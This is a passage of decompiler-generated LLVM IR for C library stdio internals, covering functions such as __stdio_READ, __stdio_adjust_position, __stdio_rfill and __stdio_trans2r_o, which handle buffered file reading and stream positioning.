  %v1_8056b09 = icmp eq i1 %v9_8056b06, false
  br i1 %v1_8056b09, label %dec_label_pc_8056b06.dec_label_pc_8056b1f_crit_edge, label %dec_label_pc_8056b0b

dec_label_pc_8056b06.dec_label_pc_8056b1f_crit_edge: ; preds = %dec_label_pc_8056b06
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8056b1f

dec_label_pc_8056b0b:                             ; preds = %dec_label_pc_8056b06
  %v0_8056b0b = load i32, i32* @ecx, align 4
  %v2_8056b0d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8056b0d, i32* %eax.global-to-local, align 4
  %v0_8056b12 = load i32, i32* @esi, align 4
  %v5_8056b12 = inttoptr i32 %v0_8056b12 to i16*
  %v6_8056b13 = call i32 @__stdio_adjust_position(i16* %v5_8056b12, i32 %v2_8056b0d, i32 %v0_8056b0b, i32 %v0_8056b0b)
  store i32 %v6_8056b13, i32* %eax.global-to-local, align 4
  %v2_8056b1b = icmp slt i32 %v6_8056b13, 0
  br i1 %v2_8056b1b, label %dec_label_pc_8056b59, label %dec_label_pc_8056b0b.dec_label_pc_8056b1f_crit_edge

dec_label_pc_8056b0b.dec_label_pc_8056b1f_crit_edge: ; preds = %dec_label_pc_8056b0b
  %v0_8056b20.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8056b1f

dec_label_pc_8056b1f:                             ; preds = %dec_label_pc_8056b06.dec_label_pc_8056b1f_crit_edge, %dec_label_pc_8056b0b.dec_label_pc_8056b1f_crit_edge
  %v2_8056b21.pre-phi = phi i32 [ %.pre6, %dec_label_pc_8056b06.dec_label_pc_8056b1f_crit_edge ], [ %v2_8056b0d, %dec_label_pc_8056b0b.dec_label_pc_8056b1f_crit_edge ]
  %v0_8056b20 = phi i32 [ %v0_8056b06, %dec_label_pc_8056b06.dec_label_pc_8056b1f_crit_edge ], [ %v0_8056b20.pre, %dec_label_pc_8056b0b.dec_label_pc_8056b1f_crit_edge ]
  %v0_8056b1f = load i32, i32* @edx, align 4
  store i32 %v2_8056b21.pre-phi, i32* %eax.global-to-local, align 4
  %v0_8056b26 = load i32, i32* @esi, align 4
  %v5_8056b27 = inttoptr i32 %v2_8056b21.pre-phi to i32*
  %v6_8056b27 = call i32 @__stdio_seek(i32 %v0_8056b26, i32* %v5_8056b27, i32 %v0_8056b20, i32 %v0_8056b1f)
  store i32 %v6_8056b27, i32* %eax.global-to-local, align 4
  %v2_8056b2f = icmp slt i32 %v6_8056b27, 0
  br i1 %v2_8056b2f, label %dec_label_pc_8056b59, label %dec_label_pc_8056b33

dec_label_pc_8056b33:                             ; preds = %dec_label_pc_8056b1f
  %v0_8056b33 = load i32, i32* @esi, align 4
  %v1_8056b33 = inttoptr i32 %v0_8056b33 to i32*
  %v2_8056b33 = load i32, i32* %v1_8056b33, align 4
  store i32 %v2_8056b33, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8056b37 = add i32 %v0_8056b33, 44
  %v2_8056b37 = inttoptr i32 %v1_8056b37 to i32*
  store i32 0, i32* %v2_8056b37, align 4
  %v0_8056b3e = load i32, i32* @esi, align 4
  %v1_8056b3e = add i32 %v0_8056b3e, 2
  %v2_8056b3e = inttoptr i32 %v1_8056b3e to i8*
  store i8 0, i8* %v2_8056b3e, align 1
  %v0_8056b42 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056b42 = and i32 %v0_8056b42, -72
  store i32 %v1_8056b42, i32* %eax.global-to-local, align 4
  %v1_8056b45 = trunc i32 %v1_8056b42 to i16
  %v2_8056b45 = load i32, i32* @esi, align 4
  %v3_8056b45 = inttoptr i32 %v2_8056b45 to i16*
  store i16 %v1_8056b45, i16* %v3_8056b45, align 2
  %v0_8056b48 = load i32, i32* @esi, align 4
  %v1_8056b48 = add i32 %v0_8056b48, 8
  %v2_8056b48 = inttoptr i32 %v1_8056b48 to i32*
  %v3_8056b48 = load i32, i32* %v2_8056b48, align 4
  store i32 %v3_8056b48, i32* %eax.global-to-local, align 4
  %v2_8056b4b = add i32 %v0_8056b48, 16
  %v3_8056b4b = inttoptr i32 %v2_8056b4b to i32*
  store i32 %v3_8056b48, i32* %v3_8056b4b, align 4
  %v0_8056b4e = load i32, i32* %eax.global-to-local, align 4
  %v1_8056b4e = load i32, i32* @esi, align 4
  %v2_8056b4e = add i32 %v1_8056b4e, 20
  %v3_8056b4e = inttoptr i32 %v2_8056b4e to i32*
  store i32 %v0_8056b4e, i32* %v3_8056b4e, align 4
  %v0_8056b51 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056b51 = load i32, i32* @esi, align 4
  %v2_8056b51 = add i32 %v1_8056b51, 24
  %v3_8056b51 = inttoptr i32 %v2_8056b51 to i32*
  store i32 %v0_8056b51, i32* %v3_8056b51, align 4
  %v0_8056b54 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056b54 = load i32, i32* @esi, align 4
  %v2_8056b54 = add i32 %v1_8056b54, 28
  %v3_8056b54 = inttoptr i32 %v2_8056b54 to i32*
  store i32 %v0_8056b54, i32* %v3_8056b54, align 4
  br label %dec_label_pc_8056b5c

dec_label_pc_8056b59:                             ; preds = %dec_label_pc_8056b1f, %dec_label_pc_8056b0b, %dec_label_pc_8056af6
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056b5c

dec_label_pc_8056b5c:                             ; preds = %dec_label_pc_8056b33, %dec_label_pc_8056b59
  br i1 %v1_8056ad0, label %dec_label_pc_8056b71, label %dec_label_pc_8056b60

dec_label_pc_8056b60:                             ; preds = %dec_label_pc_8056b5c
  %v2_8056b64 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8056b64, i32* @eax, align 4
  %v3_8056b69 = call i32 @__pthread_return_void(i32 %v2_8056b64, i32 1)
  store i32 %v3_8056b69, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056b71

dec_label_pc_8056b71:                             ; preds = %dec_label_pc_8056b5c, %dec_label_pc_8056ab8, %dec_label_pc_8056b60
  %v0_8056b74 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8056b74, i32* %eax.global-to-local, align 4
  store i32 %v0_8056a97, i32* @ebx, align 4
  store i32 %v0_8056a96, i32* @esi, align 4
  store i32 %v0_8056a95, i32* @edi, align 4
  store i32 %v0_8056a94, i32* @ebp, align 4
  ret i32 %v0_8056b74

; uselistorder directives
  uselistorder i32 %v2_8056b21.pre-phi, { 1, 0 }
  uselistorder i32 %v0_8056b06, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i8 64, { 0, 3, 4, 5, 1, 2 }
  uselistorder i32 (i32)* @__pthread_return_0, { 29, 16, 15, 14, 13, 12, 11, 10, 3, 28, 7, 33, 8, 2, 1, 0, 6, 32, 5, 9, 22, 21, 20, 24, 23, 31, 19, 30, 4, 18, 17, 27, 26, 25 }
  uselistorder i32 (i32, i32)* @__pthread_return_void, { 51, 50, 47, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 1, 0, 49, 48, 7, 6, 59, 58, 9, 8, 5, 4, 57, 56, 3, 2, 11, 10, 36, 35, 34, 33, 32, 31, 40, 39, 38, 37, 55, 54, 30, 29, 53, 52, 28, 27, 26, 25, 46, 45, 44, 43, 42, 41 }
  uselistorder i32 134565087, { 2, 3, 27, 28, 29, 30, 31, 32, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12, 1, 20, 21, 22, 13, 23, 14, 15, 16, 17, 24, 25, 26, 18, 19 }
  uselistorder i32 52, { 8, 1, 13, 2, 3, 4, 5, 14, 15, 6, 11, 7, 9, 16, 12, 10, 0 }
  uselistorder i32 22, { 8, 15, 3, 4, 5, 6, 11, 14, 13, 9, 10, 12, 16, 7, 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8056b71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056b5c, { 1, 0 }
  uselistorder label %dec_label_pc_8056b1f, { 1, 0 }
  uselistorder label %dec_label_pc_8056af1, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8056b7c = load i32, i32* @ebx, align 4
  store i32 %v0_8056b7c, i32* %stack_var_-4, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v4_8056b82 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8056b82, i32* @ebx, align 4
  %v1_8056b8a = bitcast i16* %arg1 to i8*
  %v2_8056b8a = load i8, i8* %v1_8056b8a, align 1
  %v3_8056b8a = and i8 %v2_8056b8a, 4
  %v4_8056b8a = icmp eq i8 %v3_8056b8a, 0
  %v1_8056b8d = icmp eq i1 %v4_8056b8a, false
  br i1 %v1_8056b8d, label %dec_label_pc_8056bc5, label %dec_label_pc_8056b8f

dec_label_pc_8056b8f:                             ; preds = %entry
  %v2_8056b8f = icmp slt i32 %arg3, 0
  %v3_8056b96 = select i1 %v2_8056b8f, i32 2147483647, i32 %arg3
  %v1_8056b9f = add i32 %v4_8056b82, 4
  %v2_8056b9f = inttoptr i32 %v1_8056b9f to i32*
  %v3_8056b9f = load i32, i32* %v2_8056b9f, align 4
  %v3_8056ba2 = inttoptr i32 %arg2 to i32*
  %v4_8056ba2 = call i32 @__libc_read(i32 %v3_8056b9f, i32* %v3_8056ba2, i32 %v3_8056b96)
  store i32 %v4_8056ba2, i32* %ecx.global-to-local, align 4
  %tmp11 = icmp slt i32 %v4_8056ba2, 1
  %tmp12 = icmp eq i1 %tmp11, false
  br i1 %tmp12, label %dec_label_pc_8056bc5, label %dec_label_pc_8056bb1

dec_label_pc_8056bb1:                             ; preds = %dec_label_pc_8056b8f
  %v1_8056baa = icmp eq i32 %v4_8056ba2, 0
  %v4_8056baf = icmp eq i1 %v1_8056baa, false
  %v0_8056bb1 = load i32, i32* @ebx, align 4
  %v1_8056bb1 = inttoptr i32 %v0_8056bb1 to i32*
  %v2_8056bb1 = load i32, i32* %v1_8056bb1, align 4
  br i1 %v4_8056baf, label %dec_label_pc_8056bbd, label %dec_label_pc_8056bb5

dec_label_pc_8056bb5:                             ; preds = %dec_label_pc_8056bb1
  %v1_8056bb5 = or i32 %v2_8056bb1, 4
  %v1_8056bb8 = trunc i32 %v1_8056bb5 to i16
  %v3_8056bb8 = inttoptr i32 %v0_8056bb1 to i16*
  store i16 %v1_8056bb8, i16* %v3_8056bb8, align 2
  br label %dec_label_pc_8056bc5

dec_label_pc_8056bbd:                             ; preds = %dec_label_pc_8056bb1
  %v1_8056bbd = or i32 %v2_8056bb1, 8
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_8056bc2 = trunc i32 %v1_8056bbd to i16
  %v3_8056bc2 = inttoptr i32 %v0_8056bb1 to i16*
  store i16 %v1_8056bc2, i16* %v3_8056bc2, align 2
  br label %dec_label_pc_8056bc5

dec_label_pc_8056bc5:                             ; preds = %dec_label_pc_8056b8f, %entry, %dec_label_pc_8056bb5, %dec_label_pc_8056bbd
  %v0_8056bc6 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8056bc9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8056bc9, i32* @ebx, align 4
  ret i32 %v0_8056bc6

; uselistorder directives
  uselistorder i32 %v4_8056ba2, { 2, 0, 1 }
  uselistorder i32* %ecx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 2147483647, { 2, 0, 1, 3 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8056bc5, { 3, 2, 0, 1 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v4_8056bd4 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8056bd4, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_8056bdc = load i16, i16* %arg1, align 2
  %v3_8056bdc = zext i16 %v2_8056bdc to i32
  store i32 %v3_8056bdc, i32* %ecx.global-to-local, align 4
  %tmp = urem i16 %v2_8056bdc, 4
  %v1_8056be1 = zext i16 %tmp to i32
  %v2_8056be1 = icmp eq i16 %tmp, 0
  br i1 %v2_8056be1, label %dec_label_pc_8056c10, label %dec_label_pc_8056be6

dec_label_pc_8056be6:                             ; preds = %entry
  %v1_8056be8 = add nsw i32 %v1_8056be1, -1
  %v8_8056be8 = icmp eq i32 %v1_8056be8, 0
  store i32 %v1_8056be8, i32* @edx, align 4
  br i1 %v8_8056be8, label %dec_label_pc_8056c10, label %dec_label_pc_8056beb

dec_label_pc_8056beb:                             ; preds = %dec_label_pc_8056be6
  %v3_8056beb = and i32 %v3_8056bdc, 2048
  %v4_8056beb = icmp eq i32 %v3_8056beb, 0
  br i1 %v4_8056beb, label %dec_label_pc_8056c10, label %dec_label_pc_8056bf0

dec_label_pc_8056bf0:                             ; preds = %dec_label_pc_8056beb
  %v6_8056bf0 = sub nsw i32 1, %v1_8056be1
  %v7_8056bf0 = and i32 %v1_8056be8, %v6_8056bf0
  %v8_8056bf0 = icmp slt i32 %v7_8056bf0, 0
  %v9_8056bf0 = icmp eq i16 %tmp, 2
  %v10_8056bf0 = icmp ult i16 %tmp, 2
  %v3_8056bf3 = icmp eq i1 %v10_8056bf0, %v8_8056bf0
  %v4_8056bf3 = icmp eq i1 %v9_8056bf0, false
  %v5_8056bf3 = and i1 %v4_8056bf3, %v3_8056bf3
  br i1 %v5_8056bf3, label %dec_label_pc_8056c64, label %dec_label_pc_8056bf5

dec_label_pc_8056bf5:                             ; preds = %dec_label_pc_8056bf0
  %v1_8056bf5 = add i32 %v4_8056bd4, 40
  %v2_8056bf5 = inttoptr i32 %v1_8056bf5 to i32*
  %v3_8056bf5 = load i32, i32* %v2_8056bf5, align 4
  %v4_8056bf5 = icmp eq i32 %v3_8056bf5, 0
  %v1_8056bf9 = icmp eq i1 %v4_8056bf5, false
  br i1 %v1_8056bf9, label %dec_label_pc_8056c64, label %dec_label_pc_8056bfb

dec_label_pc_8056bfb:                             ; preds = %dec_label_pc_8056bf5
  %v1_8056bfb = add i32 %v4_8056bd4, 3
  %v2_8056bfb = inttoptr i32 %v1_8056bfb to i8*
  %v3_8056bfb = load i8, i8* %v2_8056bfb, align 1
  %v4_8056bfb = zext i8 %v3_8056bfb to i32
  %v2_8056bff = sub nsw i32 %v1_8056be8, %v4_8056bfb
  %v1_8056c01 = add i32 %v4_8056bd4, 44
  %v2_8056c01 = inttoptr i32 %v1_8056c01 to i32*
  %v3_8056c01 = load i32, i32* %v2_8056c01, align 4
  %v1_8056c05 = add nsw i32 %v2_8056bff, -1
  %tmp12 = icmp slt i32 %v3_8056c01, 1
  br i1 %tmp12, label %dec_label_pc_8056c10, label %dec_label_pc_8056c0a

dec_label_pc_8056c0a:                             ; preds = %dec_label_pc_8056bfb
  %v1_8056c0a = add i32 %v4_8056bd4, 2
  %v2_8056c0a = inttoptr i32 %v1_8056c0a to i8*
  %v3_8056c0a = load i8, i8* %v2_8056c0a, align 1
  %v4_8056c0a = zext i8 %v3_8056c0a to i32
  %v2_8056c0e = sub nsw i32 %v1_8056c05, %v4_8056c0a
  br label %dec_label_pc_8056c10

dec_label_pc_8056c10:                             ; preds = %dec_label_pc_8056bfb, %dec_label_pc_8056beb, %dec_label_pc_8056be6, %entry, %dec_label_pc_8056c0a
  %v0_8056c25 = phi i32 [ %v1_8056c05, %dec_label_pc_8056bfb ], [ %v1_8056be8, %dec_label_pc_8056beb ], [ 0, %dec_label_pc_8056be6 ], [ 0, %entry ], [ %v2_8056c0e, %dec_label_pc_8056c0a ]
  %v2_8056c10 = and i32 %v3_8056bdc, 64
  %v3_8056c10 = icmp eq i32 %v2_8056c10, 0
  %storemerge.in.in.v = select i1 %v3_8056c10, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %v4_8056bd4
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_8056c1d = add i32 %v4_8056bd4, 16
  %v3_8056c1d = inttoptr i32 %v2_8056c1d to i32*
  %v4_8056c1d = load i32, i32* %v3_8056c1d, align 4
  %v5_8056c1d = sub i32 %storemerge, %v4_8056c1d
  %v1_8056c20 = inttoptr i32 %arg2 to i32*
  %v2_8056c20 = load i32, i32* %v1_8056c20, align 4
  store i32 %v2_8056c20, i32* %ecx.global-to-local, align 4
  %v1_8056c22 = add i32 %arg2, 4
  %v2_8056c22 = inttoptr i32 %v1_8056c22 to i32*
  %v3_8056c22 = load i32, i32* %v2_8056c22, align 4
  store i32 %v3_8056c22, i32* %ebx.global-to-local, align 4
  %v2_8056c25 = add i32 %v5_8056c1d, %v0_8056c25
  store i32 %v2_8056c25, i32* %esi.global-to-local, align 4
  %v5_8056c39 = sub i32 %v2_8056c20, %v2_8056c25
  %v10_8056c39 = icmp ult i32 %v2_8056c20, %v2_8056c25
  %v6_8056c3d = zext i1 %v10_8056c39 to i32
  %tmp14 = icmp slt i32 %v2_8056c25, 0
  %v2_8056c2a.neg = zext i1 %tmp14 to i32
  %v7_8056c3d = add i32 %v3_8056c22, %v2_8056c2a.neg
  %v8_8056c3d = add i32 %v7_8056c3d, %v6_8056c3d
  store i32 %v8_8056c3d, i32* @edx, align 4
  store i32 %v5_8056c39, i32* %v1_8056c20, align 4
  %v0_8056c43 = load i32, i32* @edx, align 4
  %v1_8056c43 = load i32, i32* %edi.global-to-local, align 4
  %v2_8056c43 = add i32 %v1_8056c43, 4
  %v3_8056c43 = inttoptr i32 %v2_8056c43 to i32*
  store i32 %v0_8056c43, i32* %v3_8056c43, align 4
  %v0_8056c46 = load i32, i32* %edi.global-to-local, align 4
  %v1_8056c46 = add i32 %v0_8056c46, 4
  %v2_8056c46 = inttoptr i32 %v1_8056c46 to i32*
  %v3_8056c46 = load i32, i32* %v2_8056c46, align 4
  %v4_8056c46 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8056c49 = icmp slt i32 %v3_8056c46, %v4_8056c46
  br i1 %v5_8056c49, label %dec_label_pc_8056c53, label %dec_label_pc_8056c4b

dec_label_pc_8056c4b:                             ; preds = %dec_label_pc_8056c10
  %v8_8056c4b = icmp sgt i32 %v3_8056c46, %v4_8056c46
  br i1 %v8_8056c4b, label %dec_label_pc_8056c51, label %dec_label_pc_8056c4d

dec_label_pc_8056c4d:                             ; preds = %dec_label_pc_8056c4b
  %v1_8056c4d = inttoptr i32 %v0_8056c46 to i32*
  %v2_8056c4d = load i32, i32* %v1_8056c4d, align 4
  %v3_8056c4d = load i32, i32* %ecx.global-to-local, align 4
  %tmp15 = icmp ugt i32 %v2_8056c4d, %v3_8056c4d
  br i1 %tmp15, label %dec_label_pc_8056c51, label %dec_label_pc_8056c53

dec_label_pc_8056c51:                             ; preds = %dec_label_pc_8056c4d, %dec_label_pc_8056c4b
  %v0_8056c51 = load i32, i32* %esi.global-to-local, align 4
  %v1_8056c51 = sub i32 0, %v0_8056c51
  store i32 %v1_8056c51, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8056c53

dec_label_pc_8056c53:                             ; preds = %dec_label_pc_8056c4d, %dec_label_pc_8056c10, %dec_label_pc_8056c51
  %v0_8056c53 = load i32, i32* %esi.global-to-local, align 4
  %v2_8056c53 = icmp slt i32 %v0_8056c53, 0
  %v1_8056c55 = icmp eq i1 %v2_8056c53, false
  br i1 %v1_8056c55, label %dec_label_pc_8056c67, label %dec_label_pc_8056c57

dec_label_pc_8056c57:                             ; preds = %dec_label_pc_8056c53
  %v1_8056c57 = call i32 @__errno_location(i32 %v2_8056c25)
  %v1_8056c5c = inttoptr i32 %v1_8056c57 to i32*
  store i32 75, i32* %v1_8056c5c, align 4
  %v0_8056c6a.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8056c67

dec_label_pc_8056c64:                             ; preds = %dec_label_pc_8056bf5, %dec_label_pc_8056bf0
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8056c67

dec_label_pc_8056c67:                             ; preds = %dec_label_pc_8056c53, %dec_label_pc_8056c57, %dec_label_pc_8056c64
  %v0_8056c6a = phi i32 [ %v0_8056c53, %dec_label_pc_8056c53 ], [ %v0_8056c6a.pre, %dec_label_pc_8056c57 ], [ -1, %dec_label_pc_8056c64 ]
  ret i32 %v0_8056c6a

; uselistorder directives
  uselistorder i32 %v4_8056c46, { 1, 0 }
  uselistorder i32 %v3_8056c46, { 1, 0 }
  uselistorder i32 %v2_8056c25, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v1_8056be8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_8056bd4, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 75, { 2, 1, 0 }
  uselistorder i16 2, { 0, 1, 4, 2, 3 }
  uselistorder i32 2048, { 3, 0, 4, 1, 2, 7, 8, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8056c67, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056c53, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056c10, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_8056c70 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8056c78 = add i32 %arg1, 8
  %v2_8056c78 = inttoptr i32 %v1_8056c78 to i32*
  %v3_8056c78 = load i32, i32* %v2_8056c78, align 4
  store i32 %v3_8056c78, i32* %edx.global-to-local, align 4
  %v1_8056c7b = add i32 %arg1, 12
  %v2_8056c7b = inttoptr i32 %v1_8056c7b to i32*
  %v3_8056c7b = load i32, i32* %v2_8056c7b, align 4
  %v2_8056c7e = sub i32 %v3_8056c7b, %v3_8056c78
  %v3_8056c83 = inttoptr i32 %arg1 to i16*
  %v4_8056c83 = call i32 @__stdio_READ(i16* %v3_8056c83, i32 %v3_8056c78, i32 %v2_8056c7e)
  %v0_8056c88 = load i32, i32* @ebx, align 4
  %v1_8056c88 = add i32 %v0_8056c88, 8
  %v2_8056c88 = inttoptr i32 %v1_8056c88 to i32*
  %v3_8056c88 = load i32, i32* %v2_8056c88, align 4
  store i32 %v3_8056c88, i32* %edx.global-to-local, align 4
  %v2_8056c8b = add i32 %v0_8056c88, 16
  %v3_8056c8b = inttoptr i32 %v2_8056c8b to i32*
  store i32 %v3_8056c88, i32* %v3_8056c8b, align 4
  %v0_8056c8e = load i32, i32* %edx.global-to-local, align 4
  %v2_8056c8e = add i32 %v0_8056c8e, %v4_8056c83
  store i32 %v2_8056c8e, i32* %edx.global-to-local, align 4
  %v1_8056c90 = load i32, i32* @ebx, align 4
  %v2_8056c90 = add i32 %v1_8056c90, 20
  %v3_8056c90 = inttoptr i32 %v2_8056c90 to i32*
  store i32 %v2_8056c8e, i32* %v3_8056c90, align 4
  store i32 %v0_8056c70, i32* @ebx, align 4
  ret i32 %v4_8056c83

; uselistorder directives
  uselistorder i32 %v4_8056c83, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8056c98 = load i32, i32* @ebx, align 4
  %v4_8056c9c = ptrtoint i16* %arg1 to i32
  store i32 %v4_8056c9c, i32* @ebx, align 4
  %v2_8056ca4 = load i16, i16* %arg1, align 2
  %v3_8056ca4 = zext i16 %v2_8056ca4 to i32
  %v2_8056ca7 = and i32 %v3_8056ca4, %arg2
  %v3_8056ca7 = icmp eq i32 %v2_8056ca7, 0
  %v1_8056ca9 = icmp eq i1 %v3_8056ca7, false
  br i1 %v1_8056ca9, label %dec_label_pc_8056cb7, label %dec_label_pc_8056cab

dec_label_pc_8056cab:                             ; preds = %entry
  %v1_8056cab = and i32 %v3_8056ca4, 2176
  %v2_8056cab = icmp eq i32 %v1_8056cab, 0
  %v1_8056cb0 = icmp eq i1 %v2_8056cab, false
  br i1 %v1_8056cb0, label %dec_label_pc_8056cbe, label %dec_label_pc_8056cb2

dec_label_pc_8056cb2:                             ; preds = %dec_label_pc_8056cab
  %v2_8056cb2 = or i32 %v3_8056ca4, %arg2
  %v1_8056cb4 = trunc i32 %v2_8056cb2 to i16
  store i16 %v1_8056cb4, i16* %arg1, align 2
  %v0_8056cb7.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8056cb7

dec_label_pc_8056cb7:                             ; preds = %entry, %dec_label_pc_8056cb2
  %v0_8056cdd = phi i32 [ %v4_8056c9c, %entry ], [ %v0_8056cb7.pre, %dec_label_pc_8056cb2 ]
  %v1_8056cb7 = inttoptr i32 %v0_8056cdd to i16*
  %v2_8056cb7 = load i16, i16* %v1_8056cb7, align 2
  %v2_8056cba = and i16 %v2_8056cb7, 16
  %v3_8056cba = icmp eq i16 %v2_8056cba, 0
  br i1 %v3_8056cba, label %dec_label_pc_8056cd6, label %dec_label_pc_8056cbe

dec_label_pc_8056cbe:                             ; preds = %dec_label_pc_8056cb7, %dec_label_pc_8056cab
  %v1_8056cbe = call i32 @__errno_location(i32 %v0_8056c98)
  %v1_8056cc3 = inttoptr i32 %v1_8056cbe to i32*
  store i32 9, i32* %v1_8056cc3, align 4
  br label %dec_label_pc_8056cc9

dec_label_pc_8056cc9:                             ; preds = %dec_label_pc_8056cda, %dec_label_pc_8056cbe
  %v0_8056cc9 = load i32, i32* @ebx, align 4
  %v1_8056cc9 = inttoptr i32 %v0_8056cc9 to i32*
  %v2_8056cc9 = load i32, i32* %v1_8056cc9, align 4
  %v1_8056ccb = or i32 %v2_8056cc9, 8
  %v1_8056cce = trunc i32 %v1_8056ccb to i16
  %v3_8056cce = inttoptr i32 %v0_8056cc9 to i16*
  store i16 %v1_8056cce, i16* %v3_8056cce, align 2
  br label %dec_label_pc_8056d02

dec_label_pc_8056cd6:                             ; preds = %dec_label_pc_8056cb7
  %v2_8056cd6 = and i16 %v2_8056cb7, 64
  %v3_8056cd6 = icmp eq i16 %v2_8056cd6, 0
  br i1 %v3_8056cd6, label %dec_label_pc_8056cf8, label %dec_label_pc_8056cda

dec_label_pc_8056cda:                             ; preds = %dec_label_pc_8056cd6
  %v2_8056cde = call i32 @__stdio_wcommit(i32 %v0_8056cdd)
  %v1_8056ce6 = icmp eq i32 %v2_8056cde, 0
  %v1_8056ce8 = icmp eq i1 %v1_8056ce6, false
  br i1 %v1_8056ce8, label %dec_label_pc_8056cc9, label %dec_label_pc_8056cea

dec_label_pc_8056cea:                             ; preds = %dec_label_pc_8056cda
  %v0_8056cea = load i32, i32* @ebx, align 4
  %v1_8056cea = add i32 %v0_8056cea, 8
  %v2_8056cea = inttoptr i32 %v1_8056cea to i32*
  %v3_8056cea = load i32, i32* %v2_8056cea, align 4
  %v2_8056ced = add i32 %v0_8056cea, 28
  %v3_8056ced = inttoptr i32 %v2_8056ced to i32*
  store i32 %v3_8056cea, i32* %v3_8056ced, align 4
  %v0_8056cf0 = load i32, i32* @ebx, align 4
  %v1_8056cf0 = inttoptr i32 %v0_8056cf0 to i32*
  %v2_8056cf0 = load i32, i32* %v1_8056cf0, align 4
  %v2_8056cf0.tr = trunc i32 %v2_8056cf0 to i16
  %v1_8056cf5 = and i16 %v2_8056cf0.tr, -65
  %v3_8056cf5 = inttoptr i32 %v0_8056cf0 to i16*
  store i16 %v1_8056cf5, i16* %v3_8056cf5, align 2
  %v0_8056cf8.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8056cf8

dec_label_pc_8056cf8:                             ; preds = %dec_label_pc_8056cd6, %dec_label_pc_8056cea
  %v2_8056cfd = phi i32 [ %v0_8056cdd, %dec_label_pc_8056cd6 ], [ %v0_8056cf8.pre, %dec_label_pc_8056cea ]
  %v1_8056cf8 = inttoptr i32 %v2_8056cfd to i32*
  %v2_8056cf8 = load i32, i32* %v1_8056cf8, align 4
  %v1_8056cfa = or i32 %v2_8056cf8, 1
  %v1_8056cfd = trunc i32 %v1_8056cfa to i16
  %v3_8056cfd = inttoptr i32 %v2_8056cfd to i16*
  store i16 %v1_8056cfd, i16* %v3_8056cfd, align 2
  br label %dec_label_pc_8056d02

dec_label_pc_8056d02:                             ; preds = %dec_label_pc_8056cc9, %dec_label_pc_8056cf8
  %storemerge = phi i32 [ 0, %dec_label_pc_8056cf8 ], [ -1, %dec_label_pc_8056cc9 ]
  %v2_8056d02 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8056d02, i32* @edx, align 4
  store i32 %v0_8056c98, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8056ca4, { 0, 2, 1 }
  uselistorder i32 %v0_8056c98, { 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 3, 6, 5, 4, 2, 1, 0 }
  uselistorder i16 0, { 0, 8, 2, 1, 9, 6, 10, 7, 11, 12, 13, 14, 15, 16, 17, 3, 4, 5 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8056d02, { 1, 0 }
